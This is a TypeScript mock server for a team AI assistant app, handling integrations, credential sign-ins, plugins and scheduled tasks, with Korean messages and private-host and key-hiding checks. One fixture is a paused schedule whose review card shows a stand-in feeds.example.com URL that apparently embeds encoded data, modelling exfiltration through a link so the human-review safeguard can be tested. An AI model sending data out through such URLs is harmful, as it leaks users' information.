    cancelMyCredentialLogin: (c) => { this.cancelLogin(c.params.id, c.user); return undefined },

    // ---------------- external services (like server/src/routes/integrations.ts) ----------------
    listIntegrations: (c) => ({
      items: this.integrations.filter((x) => this.integrationAllows(x, c.user)).map((x) => this.integrationView(x, c.user)),
      personalAllowed: this.settings.personalIntegrations,
    }),
    createIntegration: (c) => {
      if (!this.settings.personalIntegrations) fail('forbidden', 403, '팀에서 개인 연결을 꺼 두었어요.')
      if (c.body.access) fail('validation', 400, '사용할 사람은 팀 연결에만 정해요.', { 'body.access': 'team connections only' })
      return { status: 201, body: this.addIntegration(c.user, c.body, 'personal') }
    },
    updateIntegration: (c) => this.patchIntegration(c.user, c.params.id, c.body),
    deleteIntegration: (c) => {
      const x = this.manageableIntegration(c.user, c.params.id)
      this.integrations = this.integrations.filter((y) => y.id !== x.id)
      this.integrationSecrets.delete(x.id)
      return undefined
    },
    // like server/src/integrations/connections/service.ts setTool: whoever manages it, a tool the service lists
    setIntegrationTool: (c) => {
      const x = this.manageableIntegration(c.user, c.params.id)
      if (x.kind !== 'mcp' || !x.tools.some((t) => t.name === c.body.name)) fail('validation', 400, '이 서비스가 지금 알려 준 도구 목록에 없는 도구예요.', { 'body.name': 'unknown tool' })
      x.disabledTools = c.body.enabled ? x.disabledTools.filter((n) => n !== c.body.name) : [...new Set([...x.disabledTools, c.body.name])]
      x.tools = x.tools.map((t) => ({ ...t, enabled: !x.disabledTools.includes(t.name) }))
      return this.integrationView(x, c.user)
    },
    refreshIntegration: (c) => {
      const x = this.manageableIntegration(c.user, c.params.id)
      this.checkIntegration(x)
      x.updatedAt = now()
      return this.integrationView(x, c.user)
    },
    authorizeIntegration: (c) => {
      const x = this.manageableIntegration(c.user, c.params.id)
      if (x.kind !== 'mcp' || x.auth !== 'oauth') fail('conflict', 409, '이 연결은 로그인을 쓰지 않아요.')
      const flow: IntegrationFlow = { flowId: uuidv7(), state: 'pending', expiresAt: new Date(Date.now() + 10 * 60_000).toISOString(), reason: null }
      this.integrationFlows.set(flow.flowId, { flow, integrationId: x.id, userId: c.user.id, polls: 0 })
      return { flowId: flow.flowId, authorizationUrl: `https://auth.example.test/authorize?client_id=mock&state=${flow.flowId}`, expiresAt: flow.expiresAt }
    },
    integrationFlow: (c) => {
      const f = this.integrationFlows.get(c.params.id)
      if (!f || f.userId !== c.user.id) return fail('not_found', 404)
      // the person finishes at the service by the second poll: the server has the tokens and checks the connection
      if (f.flow.state === 'pending' && ++f.polls >= 2) {
        const x = this.integrations.find((y) => y.id === f.integrationId)
        if (!x) Object.assign(f.flow, { state: 'failed', reason: '연결이 지워졌어요.' })
        else {
          this.integrationSecrets.set(x.id, 'oauth-tokens')
          x.account = `${c.user.username}@example.test`
          this.checkIntegration(x)
          f.flow.state = 'completed'
          // made from an admin's request: connected now that the member signed in
          for (const r of this.integrationRequests) if (r.integrationId === x.id && this.requestState(r) === 'waiting') Object.assign(r, { state: 'connected', endedAt: now() })
        }
      }
      return f.flow
    },
    listTeamIntegrations: (c) => ({ items: this.integrations.filter((x) => x.scope === 'team').map((x) => this.integrationView(x, c.user)) }),
    // like server/src/integrations/connections/requests.ts: only the member asked sees or answers a request; no key in it
    listIntegrationRequests: (c) => ({ items: this.integrationRequests.filter((r) => r.user.id === c.user.id && this.requestState(r) === 'waiting').map((r) => this.requestView(r)) }),
    getIntegrationRequest: (c) => this.requestView(this.myRequest(c.user, c.params.id)),
    completeIntegrationRequest: (c) => {
      const r = this.waitingRequest(this.myRequest(c.user, c.params.id))
      if (r.auth !== 'oauth' && !c.body.secret) fail('validation', 400, '키가 아직 없어요. 키를 넣어 주세요.', { 'body.secret': 'required' })
      const made = r.integrationId ? this.integrations.find((x) => x.id === r.integrationId && x.ownerId === c.user.id) : undefined
      if (r.auth === 'oauth' && made) return this.integrationView(made, c.user)
      if (!this.settings.personalIntegrations) fail('forbidden', 403, '팀에서 개인 연결을 꺼 두었어요.')
      const i = this.addIntegration(c.user, { kind: r.kind, name: r.name, url: r.url, auth: r.auth, authHeader: r.authHeader, notes: r.notes, writePolicy: c.body.writePolicy ?? 'ask', ...(c.body.secret ? { secret: c.body.secret } : {}) }, 'personal')
      r.integrationId = i.id
      if (r.auth !== 'oauth') Object.assign(r, { state: 'connected', endedAt: now() })
      return i
    },
    declineIntegrationRequest: (c) => {
      const r = this.waitingRequest(this.myRequest(c.user, c.params.id))
      Object.assign(r, { state: 'declined', endedAt: now() })
      return this.requestView(r)
    },
    listTeamIntegrationRequests: () => ({ items: [...this.integrationRequests].reverse().sort((a, b) => Number(this.requestState(b) === 'waiting') - Number(this.requestState(a) === 'waiting')).map((r) => this.requestView(r)) }),
    createIntegrationRequest: (c) => {
      if (!this.settings.personalIntegrations) fail('conflict', 409, '지금은 직원이 개인 연결을 추가할 수 없어요.')
      const member = this.users.find((u) => u.id === c.body.userId && u.status === 'active') ?? fail('validation', 400, '이 팀에서 쓰고 있는 계정이 아니에요.', { 'body.userId': 'not an active account' })
      if (privateHost(new URL(c.body.url).hostname)) fail('validation', 400, '사내망이나 이 컴퓨터의 주소는 쓸 수 없어요.', { 'body.url': 'private or local address' })
      if (this.integrationRequests.some((r) => r.user.id === member.id && r.url === c.body.url && this.requestState(r) === 'waiting')) fail('conflict', 409, '이 사람에게 같은 주소로 보낸 요청이 아직 기다리고 있어요.')
      const at = Date.now()
      const r: IntegrationRequest & { integrationId: string | null } = {
        id: uuidv7(), kind: c.body.kind, name: c.body.name, url: c.body.url, auth: c.body.auth, authHeader: c.body.auth === 'header' ? c.body.authHeader ?? null : null,
        notes: c.body.kind === 'http' ? c.body.notes ?? null : null, user: { id: member.id, name: member.name }, requestedBy: { id: c.user.id, name: c.user.name },
        state: 'waiting', createdAt: new Date(at).toISOString(), expiresAt: new Date(at + 7 * 86_400_000).toISOString(), endedAt: null, link: '', integrationId: null,
      }
      this.integrationRequests.push(r)
      return { status: 201, body: this.requestView(r) }
    },
    withdrawIntegrationRequest: (c) => {
      const r = this.waitingRequest(this.integrationRequests.find((x) => x.id === c.params.id) ?? fail('not_found', 404))
      Object.assign(r, { state: 'withdrawn', endedAt: now() })
      return this.requestView(r)
    },
    // like server/src/integrations/connections/templates.ts: no key in a template; only members it is for see or connect it
    listIntegrationTemplates: (c) => ({
      items: this.integrationTemplates.filter((t) => this.templateCovers(t, c.user)).map((t) => {
        const mine = this.integrations.find((x) => x.templateId === t.id && x.ownerId === c.user.id)
        const { access: _a, createdAt: _c, updatedAt: _u, ...rest } = t
        return { ...rest, url: new URL(t.url).origin + new URL(t.url).pathname, connection: mine ? this.integrationView(mine, c.user) : null }
      }),
    }),
    connectIntegrationTemplate: (c) => {
      const t = this.integrationTemplates.find((x) => x.id === c.params.id && this.templateCovers(x, c.user)) ?? fail('not_found', 404, '이 템플릿은 나에게 공유되지 않았어요.')
      // the template as the member saw it: changed since, 409 (templates.ts connect)
      if (c.body.version !== t.version) fail('conflict', 409, '이 템플릿이 바뀌었어요. 다시 확인하고 연결해 주세요.')
      if (t.auth !== 'oauth' && !c.body.secret) fail('validation', 400, '키가 아직 없어요. 키를 넣어 주세요.', { 'body.secret': 'required' })
      const mine = this.integrations.find((x) => x.templateId === t.id && x.ownerId === c.user.id)
      if (mine) {
        if (c.body.secret) { this.integrationSecrets.set(mine.id, c.body.secret); this.checkIntegration(mine) }
        if (c.body.writePolicy) mine.writePolicy = c.body.writePolicy
        return this.integrationView(mine, c.user)
      }
      return this.addIntegration(c.user, { kind: t.kind, name: t.name, url: t.url, auth: t.auth, authHeader: t.authHeader, notes: t.notes, writePolicy: c.body.writePolicy ?? 'ask', ...(c.body.secret ? { secret: c.body.secret } : {}) }, 'personal', t.id)
    },
    listTeamIntegrationTemplates: () => ({ items: [...this.integrationTemplates].sort((a, b) => a.name.localeCompare(b.name)).map((t) => this.templateView(t)) }),
    createIntegrationTemplate: (c) => {
      if (privateHost(new URL(c.body.url).hostname)) fail('validation', 400, '사내망이나 이 컴퓨터의 주소는 쓸 수 없어요.', { 'body.url': 'private or local address' })
      const t = {
        id: uuidv7(), kind: c.body.kind, name: c.body.name, url: c.body.url, auth: c.body.auth, authHeader: c.body.auth === 'header' ? c.body.authHeader ?? null : null,
        notes: c.body.notes ?? null, access: c.body.access ?? { everyone: true, groups: [], users: [] }, createdBy: { id: c.user.id, name: c.user.name }, createdAt: now(), updatedAt: now(), version: 1,
      }
      this.integrationTemplates.push(t)
      return { status: 201, body: this.templateView(t) }
    },
    updateIntegrationTemplate: (c) => {
      const t = this.integrationTemplates.find((x) => x.id === c.params.id) ?? fail('not_found', 404)
      const auth = c.body.auth ?? t.auth
      const authHeader = auth === 'header' ? (c.body.authHeader !== undefined ? c.body.authHeader : t.authHeader) : null
      const moved = (c.body.url !== undefined && c.body.url !== t.url) || auth !== t.auth || authHeader !== t.authHeader
      Object.assign(t, { ...(c.body.name !== undefined ? { name: c.body.name } : {}), ...(c.body.url !== undefined ? { url: c.body.url } : {}), auth, authHeader, ...(c.body.notes !== undefined ? { notes: c.body.notes } : {}), ...(c.body.access ? { access: c.body.access } : {}), updatedAt: now(), version: t.version + 1 })
      // a new address or sign-in method drops every member's key; a member it no longer covers loses theirs
      for (const x of this.integrations.filter((y) => y.templateId === t.id)) {
        if (moved || !this.templateCovers(t, this.users.find((u) => u.id === x.ownerId)!)) { this.integrations = this.integrations.filter((y) => y.id !== x.id); this.integrationSecrets.delete(x.id) }
        else Object.assign(x, { name: t.name, notes: t.notes })
      }
      return this.templateView(t)
    },
    // like templates.ts members: who it is for, connected (when) / not connected / key stopped working; never a key
    listIntegrationTemplateMembers: (c) => {
      const t = this.integrationTemplates.find((x) => x.id === c.params.id) ?? fail('not_found', 404)
      return {
        items: this.users.filter((u) => u.status === 'active' && this.templateCovers(t, u)).sort((a, b) => a.name.localeCompare(b.name)).map((u) => {
          const x = this.integrations.find((y) => y.templateId === t.id && y.ownerId === u.id)
          if (!x || !this.integrationSecrets.has(x.id)) return { user: { id: u.id, name: u.name }, state: 'not_connected' as const, since: null }
          return { user: { id: u.id, name: u.name }, state: x.status === 'needs_auth' ? 'stopped' as const : x.status === 'error' ? 'error' as const : 'connected' as const, since: x.createdAt }
        }),
      }
    },
    deleteIntegrationTemplate: (c) => {
      if (!this.integrationTemplates.some((x) => x.id === c.params.id)) fail('not_found', 404)
      this.integrationTemplates = this.integrationTemplates.filter((x) => x.id !== c.params.id)
      for (const x of this.integrations.filter((y) => y.templateId === c.params.id)) this.integrationSecrets.delete(x.id)
      this.integrations = this.integrations.filter((y) => y.templateId !== c.params.id)
      return undefined
    },

    // Admin > Plugins (web/test/mock/plugins.ts)
    listPlugins: (c) => this.plugins.list(c.user.locale ?? 'ko', this.settings.defaultLocale),
    inspectPluginFile: (c) => {
      const r = this.plugins.inspectFile(c.file!.name, c.user.id, c.user.locale ?? 'ko')
      if ('reason' in r) throw new Fail('validation', 400, undefined, undefined, { reason: r.reason })
      return r
    },
    inspectPluginSource: (c) => {
      const r = c.body.source === 'catalog' ? this.plugins.inspectCatalog(c.body.id, c.user.id, c.user.locale ?? 'ko') : { reason: 'import_missing' }
      if ('reason' in r) throw new Fail('conflict', 409, undefined, undefined, { reason: r.reason })
      return r
    },
    installPlugin: (c) => {
      const r = this.plugins.install(c.body.token, c.body.manifestSha256, c.body.enable, { id: c.user.id, name: c.user.name })
      if ('reason' in r) throw new Fail(r.status === 410 ? 'gone' : 'conflict', r.status, undefined, undefined, { reason: r.reason })
      return { status: 201, body: r }
    },
    enablePlugin: (c) => this.plugins.set(c.params.id, true) ?? fail('not_found', 404),
    disablePlugin: (c) => this.plugins.set(c.params.id, false) ?? fail('not_found', 404),
    rollbackPlugin: () => { throw new Fail('conflict', 409, undefined, undefined, { reason: 'no_rollback' }) },
    uninstallPlugin: (c) => { if (!this.plugins.remove(c.params.id)) fail('not_found', 404); return undefined },
    createTeamIntegration: (c) => ({ status: 201, body: this.addIntegration(c.user, c.body, 'team') }),

    // nothing connected, no scheduled tasks yet
    listConnected: () => ({ items: [] }),
    listSchedules: (c) => ({ items: this.schedules.filter((x) => x.userId === c.user.id).map(({ userId: _, ...x }) => x), timeZone: 'Asia/Seoul' }),
    updateSchedule: (c) => {
      const x = this.schedules.find((y) => y.id === c.params.id && y.userId === c.user.id) ?? fail('not_found', 404)
      if (c.body.enabled && x.needsReview) throw new Fail('conflict', 409, '이 예약 작업은 확인 카드 없이 만들어져서 멈춰 뒀어요.', undefined, { reason: 'schedule_review' })
      x.enabled = c.body.enabled
      const { userId: _, ...out } = x
      return out
    },
    deleteSchedule: (c) => { this.schedules = this.schedules.filter((y) => !(y.id === c.params.id && y.userId === c.user.id)); return undefined },
    // like server/src/chat/schedules.ts runNow: a new chat now; the schedule and on/off stay
    runScheduleNow: (c) => {
      const x = this.schedules.find((y) => y.id === c.params.id && y.userId === c.user.id) ?? fail('not_found', 404)
      if (x.needsReview) throw new Fail('conflict', 409, '이 예약 작업은 확인 카드 없이 만들어져서 멈춰 뒀어요.', undefined, { reason: 'schedule_review' })
      if (/budget/.test(x.title)) fail('budget_exceeded', 429, '오늘 AI 사용 한도를 다 썼어요. 내일 오전 12:00부터 다시 쓸 수 있어요. 더 필요하면 관리자에게 말해 주세요.')
      const chat: Chat = { id: uuidv7(), projectId: x.projectId, title: `${x.title} · ${now().slice(0, 10)}`, engine: 'claude-code', model: null, createdAt: now(), updatedAt: now(), deletedAt: null, runState: 'idle' }
      this.chats.push(chat)
      this.publish({ type: 'chat.updated', data: { chatId: chat.id, change: 'created', chat } })
      x.lastChatId = chat.id
      x.lastOutcome = 'done'
      const { userId: _, ...out } = x
      return { schedule: out, chatId: chat.id }
    },
    // like server/src/chat/schedule-edit.ts: the checks of schedule_create, then the same card; only its answer saves
    scheduleEditCard: (c) => {
      const x = this.schedules.find((y) => y.id === c.params.id && y.userId === c.user.id) ?? fail('not_found', 404)
      return { request: this.scheduleEditRequest(x, c.body) }
    },
    editSchedule: (c) => {
      const x = this.schedules.find((y) => y.id === c.params.id && y.userId === c.user.id) ?? fail('not_found', 404)
      if (c.body.kind === 'template') {
        if (!x.templateId) throw new Fail('conflict', 409, undefined, undefined, { reason: 'schedule_not_template' })
        if (!String(c.body.outputPath).startsWith(`users/${c.user.id}`)) fail('not_found', 404)
        Object.assign(x, { time: c.body.time, weekday: x.repeat === 'weekly' ? c.body.weekday : null, sourcePath: c.body.sourcePath, outputPath: c.body.outputPath })
      } else {
        const r = this.scheduleEditRequest(x, c.body)
        if (c.body.requestId !== r.requestId) throw new Fail('conflict', 409, '예약 작업이나 연결 서비스가 그 사이에 바뀌었어요. 카드를 다시 확인해 주세요.', undefined, { reason: 'schedule_card_changed' })
        if (!r.options.some((o) => o.value === c.body.answer)) fail('validation', 400, '이 확인은 카드의 버튼으로만 답할 수 있어요.')
        if (c.body.answer !== 'cancel') Object.assign(x, { title: c.body.title.trim(), prompt: c.body.prompt.trim(), repeat: c.body.repeat, time: c.body.time, weekday: c.body.weekday ?? null, day: c.body.day ?? null, date: c.body.date ?? null,
          projectId: c.body.projectId, needsReview: false, reviewSince: null })
      }
      const { userId: _, ...out } = x
      return out
    },
    // like server/src/chat/schedule-review.ts: the schedule card again, with the whole instruction and its addresses
    getScheduleReview: (c) => {
      const x = this.schedules.find((y) => y.id === c.params.id && y.userId === c.user.id) ?? fail('not_found', 404)
      if (!x.needsReview) throw new Fail('conflict', 409, undefined, undefined, { reason: 'schedule_not_waiting' })
      const url = 'https://feeds.example.com/r/c2fsyxj5ltk4nzy1ndmy'
      return { request: {
        kind: 'ask_user' as const, origin: 'server' as const, requestId: `schedule-review-${x.id}`, allowText: false, multiple: false,
        question: `이 예약 작업은 확인 카드 없이 만들어져서 멈춰 뒀어요. 예약 작업은 아무도 지켜보지 않을 때 아래 지시문을 그대로 실행해요. 지시문과 주소를 확인하고 다시 켤지 골라 주세요.\n\n제목: ${x.title}\n일정: 매일 09:00\n\n실행할 때마다 아래 주소 1개는 묻지 않고 열어요. 주소에 내용을 실어 밖으로 보낼 수도 있으니 주소 전체를 확인해 주세요.`,
        options: [{ label: '다시 켜기', value: 'resume' }, { label: '계속 멈춰 두기', value: 'keep' }],
        details: [{ label: '지시문', text: x.prompt, marks: ['c2fsyxj5ltk4nzy1ndmy'] }, { label: '실행 때 묻지 않고 여는 주소', text: url, marks: ['c2fsyxj5ltk4nzy1ndmy'] }],
      } }
    },
    confirmScheduleReview: (c) => {
      const x = this.schedules.find((y) => y.id === c.params.id && y.userId === c.user.id) ?? fail('not_found', 404)
      if (c.body.answer !== 'resume' && c.body.answer !== 'keep') fail('validation', 400, '이 확인은 카드의 버튼으로만 답할 수 있어요.')
      if (c.body.requestId !== `schedule-review-${x.id}`) throw new Fail('conflict', 409, '예약 작업이나 연결 서비스가 그 사이에 바뀌었어요. 카드를 다시 확인해 주세요.', undefined, { reason: 'schedule_card_changed' })
      if (c.body.answer === 'resume') Object.assign(x, { needsReview: false, reviewSince: null, enabled: true, nextRunAt: new Date(Date.now() + 86400_000).toISOString() })
      const { userId: _, ...out } = x
      return out
    },
    listSchedulesAwaitingReview: () => ({ items: this.schedules.filter((x) => x.needsReview).map((x) => ({
      id: x.id, user: { id: x.userId, name: this.users.find((u) => u.id === x.userId)?.name ?? x.userId }, repeat: x.repeat, time: x.time, weekday: x.weekday, day: x.day, date: x.date, reviewSince: x.reviewSince ?? null,
    })) }),
    listScheduleTemplates: () => ({ items: [{ id: 'daily-file-index', version: 1, repeat: 'daily' }, { id: 'weekly-summary', version: 1, repeat: 'weekly' }], timeZone: 'Asia/Seoul' }),
    listNotifications: () => ({ items: [], nextCursor: null, unreadCount: 0 }),
    getNotificationPreferences: () => ({ scheduleSuccess: true, scheduleFailure: true, connectionReconnect: true, skillSuggestions: true }),
    getPushSettings: () => ({ configured: false, enabled: false, publicKey: null, subscriptionId: null }),
    listRemoteConnectors: () => ({ configured: false, resource: null, items: [] }),
    connectInfo: () => ({ teamId: 'team-acme', lanCertSha256: null, lanPort: 8443, lanHosts: [], canonicalOrigin: null }),
  }

  // ---------------- AI connections ----------------
  credentialView(c: Credential): Credential {
    return !c.owner && !c.disabled && (c.kind === 'anthropic-oauth' || c.kind === 'chatgpt') && !this.credSharedSubscriptions
      ? { ...c, state: 'sharing_off', detail: 'Shared subscriptions are off.' } : c
  }
  async addCredential(user: User, body: { kind: CredentialKind; label: string; sealed: never; acknowledgedPlanNotice?: boolean; assignments?: { subjectType: 'group' | 'user'; subjectId: string }[] }, personal: boolean): Promise<Credential> {
    if (!personal && (body.kind === 'anthropic-oauth' || body.kind === 'chatgpt') && !this.credSharedSubscriptions) fail('forbidden', 403)
    const secret = await this.sealer.unseal(body.sealed, 'credential.create').catch(() => fail('validation', 400, '보낸 값을 열 수 없어요.'))
    const re = body.kind === 'anthropic-oauth' ? /^sk-ant-oat\d{2}-/ : body.kind === 'anthropic-api-key' ? /^sk-ant-api\d{2}-/ : /^sk-(?!ant-)/
    if (!re.test(secret)) fail('validation', 400, '이 종류의 토큰·키가 아니에요.', { 'body.sealed': 'not a token of this kind' })
    if (body.kind === 'anthropic-oauth' && body.acknowledgedPlanNotice !== true) fail('validation', 400, '구독 요금제 안내를 확인해 주세요.')
    const c = this.newCredential(user, body.kind, body.label, personal, secret.includes('unverified') ? 'unverified' : 'ok')
    c.assignments = (body.assignments ?? []).map((a) => ({ ...a, name: a.subjectType === 'group' ? this.groups.find((g) => g.id === a.subjectId)?.name ?? a.subjectId : this.users.find((u) => u.id === a.subjectId)?.name ?? a.subjectId }))
    if (body.kind.endsWith('api-key')) c.hint = secret.slice(-4)
    this.credentials.push(c)
    return c
  }
  newCredential(user: User, kind: CredentialKind, label: string, personal: boolean, state: Credential['state']): Credential {
    return {
      id: uuidv7(), kind, label, scope: personal ? 'personal' : 'team', owner: personal ? { id: user.id, name: user.name } : null, assignments: [],
      priority: (this.credentials.length + 1) * 10, disabled: false, state, detail: state === 'unverified' ? '첫 질문 때 확인돼요.' : null, hint: null, planType: kind === 'chatgpt' ? 'pro' : null,
      expiresAt: kind === 'anthropic-oauth' ? new Date(Date.now() + 365 * 86400_000).toISOString() : null, limitedUntil: null, checkedAt: state === 'ok' ? now() : null, lastUsedAt: null,
      spendLimit: { usd: null, tokens: null, action: 'block' }, month: { usd: 0, tokens: 0, requests: 0 }, createdAt: now(),
    }
  }
  /** a ChatGPT sign-in: the code after a moment, then the connection. A Claude sign-in: the authorize address after a
   * moment, then it waits for the pasted code (good-code#good-state connects, anything else is a wrong code). */
  startLogin(user: User, label: string, personal: boolean, reconnectId?: string, kind: CredentialLogin['kind'] = 'chatgpt'): CredentialLogin {
    const loginId = 'login' + uuidv7().replace(/-/g, '')
    const l = { loginId, kind, state: 'starting' as CredentialLogin['state'], url: null as string | null, code: null as string | null, expiresAt: new Date(Date.now() + 16 * 60_000).toISOString(), credential: null as Credential | null, reason: null as string | null, userId: user.id, personal, label, reconnectId }
    this.credLogins.set(loginId, l)
    const pub = () => this.publish({ type: 'credential.login', data: this.loginView(l) })
    if (kind === 'anthropic-oauth') {
      setTimeout(() => { if (l.state !== 'starting') return; l.state = 'code'; l.url = MOCK_CLAUDE_AUTHORIZE; pub() }, 150)
      return this.loginView(l)
    }
    setTimeout(() => { if (l.state !== 'starting') return; l.state = 'code'; l.url = 'https://auth.openai.com/codex/device'; l.code = 'WXYZ-12AB3'; pub() }, 150)
    setTimeout(() => {
      if (l.state !== 'code') return
      if (!(personal ? this.credMemberOwn : this.credSharedSubscriptions)) { l.state = 'failed'; l.reason = 'policy_changed'; pub(); return }
      if (reconnectId) { const x = this.credentials.find((y) => y.id === reconnectId); if (x) { x.state = 'ok'; x.detail = null; l.credential = x } }
      else { const c = this.newCredential(user, 'chatgpt', label, personal, 'ok'); this.credentials.push(c); l.credential = c }
      l.state = 'done'; pub()
    }, 1200)
    return this.loginView(l)
  }
  loginView(l: CredentialLogin & { userId: string; personal: boolean; label: string; reconnectId?: string }): CredentialLogin {
    const { userId: _u, personal: _p, label: _l, reconnectId: _r, ...data } = l
    return data
  }
  /** the Claude code the person pasted (sealed like a token, opened with the server's real sealing code) */
  async loginCode(id: string, user: User, sealed: SealedSecret): Promise<CredentialLogin> {
    const l = this.credLogins.get(id)
    if (!l || l.userId !== user.id) return fail('not_found', 404)
    const code = (await this.sealer.unseal(sealed, 'credential.login-code').catch(() => fail('validation', 400, '보낸 값을 열 수 없어요.'))).trim()
    if (l.kind !== 'anthropic-oauth' || l.state !== 'code') return fail('conflict', 409, '이 로그인은 지금 코드를 받지 않아요. 다시 시작해 주세요.')
    if (!/^[A-Za-z0-9._~-]{1,512}#[A-Za-z0-9._~-]{1,512}$/.test(code)) return fail('validation', 400, 'Claude가 승인 뒤에 보여 준 코드 전체를 붙여 넣어 주세요(중간에 #가 있어요).')
    l.state = 'checking'
    const pub = () => this.publish({ type: 'credential.login', data: this.loginView(l) })
    pub()
    setTimeout(() => {
      if (l.state !== 'checking') return
      if (code === 'odd-code#good-state') { l.state = 'failed'; l.reason = 'token_unreadable'; pub(); return }
      if (code !== 'good-code#good-state') { l.state = 'failed'; l.reason = 'bad_code'; pub(); return }
      if (l.reconnectId) { const x = this.credentials.find((y) => y.id === l.reconnectId); if (x) { x.state = 'ok'; x.detail = null; l.credential = x } }
      else { const c = this.newCredential(user, 'anthropic-oauth', l.label, l.personal, 'ok'); this.credentials.push(c); l.credential = c }
      l.state = 'done'; pub()
    }, 1500)
    return this.loginView(l)
  }
  loginOf(id: string, user: User): CredentialLogin {
    const l = this.credLogins.get(id)
    if (!l || l.userId !== user.id) return fail('not_found', 404)
    return this.loginView(l)
  }
  cancelLogin(id: string, user: User) {
    const l = this.credLogins.get(id)
    if (!l || l.userId !== user.id) fail('not_found', 404)
    // like the server while it saves the new token: 409 (here for the whole check)
    if (l!.state === 'checking') fail('conflict', 409, '새 토큰을 확인하고 저장하는 중이에요. 곧 끝나요.')
    if (l!.state === 'starting' || l!.state === 'code') { l!.state = 'cancelled'; this.publish({ type: 'credential.login', data: this.loginView(l!) }) }
  }

  // ---------------- external services ----------------
  integrationView(x: MockIntegration, u: User): Integration {
    const canManage = x.scope === 'personal' ? x.ownerId === u.id : u.role !== 'member'
    const { ownerId: _o, checks: _c, disabledTools: _d, ...rest } = x
    return { ...rest, hasSecret: this.integrationSecrets.has(x.id), access: x.scope === 'team' && canManage ? x.access : null, canManage }
  }
  /** may use it in their chats: the owner of a personal one; the access rule of a team one (admins are not implied) */
  requestState(r: IntegrationRequest): IntegrationRequest['state'] {
    return r.state === 'waiting' && Date.parse(r.expiresAt) <= Date.now() ? 'expired' : r.state
  }
  requestView(r: IntegrationRequest & { integrationId: string | null }): IntegrationRequest {
    const { integrationId: _, ...out } = r
    return { ...out, state: this.requestState(r), link: `http://127.0.0.1:${process.env.MOCK_PORT ?? 19143}/settings/integrations?request=${r.id}` }
  }
  /** the member it asks; anyone else (admins included) finds nothing */
  myRequest(u: User, id: string) {
    return this.integrationRequests.find((r) => r.id === id && r.user.id === u.id) ?? fail('not_found', 404)
  }
  waitingRequest<T extends IntegrationRequest>(r: T): T {
    const state = this.requestState(r)
    if (state !== 'waiting') throw new Fail('conflict', 409, '이 요청은 더 이상 기다리고 있지 않아요.', undefined, { state })
    return r
  }
  templateCovers(t: { access: IntegrationAccess }, u: User): boolean {
    return t.access.everyone || t.access.users.includes(u.id) || t.access.groups.some((g) => u.groupIds.includes(g))
  }
  templateView(t: Omit<IntegrationTemplate, 'connected'> & { version: number }): IntegrationTemplate {
    const { version: _v, ...rest } = t
    return { ...rest, connected: this.integrations.filter((x) => x.templateId === t.id && this.integrationSecrets.has(x.id)).length }
  }
  integrationAllows(x: MockIntegration, u: User): boolean {
    if (x.scope === 'personal' && x.templateId) {
      const t = this.integrationTemplates.find((y) => y.id === x.templateId)
      return x.ownerId === u.id && !!t && this.templateCovers(t, u)
    }
    if (x.scope === 'personal') return x.ownerId === u.id
    const a = x.access ?? NO_ACCESS
    return a.everyone || a.users.includes(u.id) || a.groups.some((g) => u.groupIds.includes(g))
  }
  /** the owner of a personal connection, an admin for a team one; someone else's personal connection does not exist */
  manageableIntegration(u: User, id: string): MockIntegration {
    const x = this.integrations.find((y) => y.id === id)
    if (!x || (x.scope === 'personal' && x.ownerId !== u.id) || (x.scope === 'team' && u.role === 'member' && !this.integrationAllows(x, u))) return fail('not_found', 404)
    if (x.scope === 'team' && u.role === 'member') fail('forbidden', 403)
    return x
  }
  addIntegration(u: User, body: IntegrationInput, scope: 'personal' | 'team', templateId: string | null = null): Integration {
    if (privateHost(new URL(body.url).hostname)) fail('validation', 400, '사내망이나 이 컴퓨터의 주소는 쓸 수 없어요.', { 'body.url': 'private or local address' })
    // like the server: "run without asking" is for team connections only
    if (scope === 'personal' && body.writePolicy === 'allow') fail('validation', 400, '"묻지 않고 실행"은 팀 연결에서만 고를 수 있어요.', { 'body.writePolicy': 'team connections only' })
    const siblings = this.integrations.filter((y) => (scope === 'team' ? y.scope === 'team' : y.ownerId === u.id))
    if (!templateId && siblings.filter((y) => !y.templateId).length >= (scope === 'team' ? 50 : 20)) fail('conflict', 409, '연결을 더 만들 수 없어요.')
    const base = body.slug ?? (body.name.toLowerCase().replace(/[^a-z0-9]/g, '').slice(0, 12) || 'conn')
    let slug = base
    for (let n = 2; siblings.some((y) => y.slug === slug); n++) slug = base.slice(0, 12 - String(n).length) + n
    const x: MockIntegration = {
      id: uuidv7(), scope, kind: body.kind, name: body.name, slug, url: body.url, auth: body.auth, authHeader: body.auth === 'header' ? body.authHeader ?? null : null,
      account: null, notes: body.kind === 'http' ? body.notes ?? null : null, writePolicy: body.writePolicy, status: 'needs_auth', lastError: null, tools: [], toolsUpdatedAt: null,
      access: scope === 'team' ? body.access ?? NO_ACCESS : null, createdBy: { id: u.id, name: u.name }, createdAt: now(), updatedAt: now(), lastUsedAt: null,
      ownerId: scope === 'personal' ? u.id : null, checks: 0, disabledTools: [], templateId,
    }
    if (body.secret && (body.auth === 'bearer' || body.auth === 'header')) this.integrationSecrets.set(x.id, body.secret)
    this.integrations.push(x)
    this.checkIntegration(x)
    return this.integrationView(x, u)
  }
  patchIntegration(u: User, id: string, b: IntegrationPatch): Integration {
    const x = this.manageableIntegration(u, id)
    // made from an admin's template: only the member's key and the write rule are theirs (templates.ts)
    if (x.templateId) for (const k of ['name', 'url', 'auth', 'authHeader', 'notes', 'access'] as const) if (b[k] !== undefined) fail('validation', 400, '팀이 정한 항목이라 바꿀 수 없어요.', { [`body.${k}`]: 'set by the template' })
    if (b.writePolicy === 'allow' && x.scope !== 'team') fail('validation', 400, '"묻지 않고 실행"은 팀 연결에서만 고를 수 있어요.', { 'body.writePolicy': 'team connections only' })
    if (b.access && x.scope !== 'team') fail('validation', 400, '사용할 사람은 팀 연결에만 정해요.', { 'body.access': 'team connections only' })
    const auth = b.auth ?? x.auth
    if (auth === 'oauth' && x.kind !== 'mcp') fail('validation', 400, undefined, { 'body.auth': 'sign-in (oauth) is for MCP servers' })
    const header = auth === 'header' ? (b.authHeader !== undefined ? b.authHeader : x.authHeader) : null
    if (auth === 'header' && !header) fail('validation', 400, undefined, { 'body.authHeader': 'give the header name' })
    const moved = (b.url !== undefined && b.url !== x.url) || auth !== x.auth
    if (b.url !== undefined && privateHost(new URL(b.url).hostname)) fail('validation', 400, '사내망이나 이 컴퓨터의 주소는 쓸 수 없어요.', { 'body.url': 'private or local address' })
    if (b.name !== undefined) x.name = b.name
    if (b.url !== undefined) x.url = b.url
    x.auth = auth
    x.authHeader = header
    if (b.notes !== undefined && x.kind === 'http') x.notes = b.notes
    if (b.writePolicy) x.writePolicy = b.writePolicy
    if (b.access) x.access = b.access
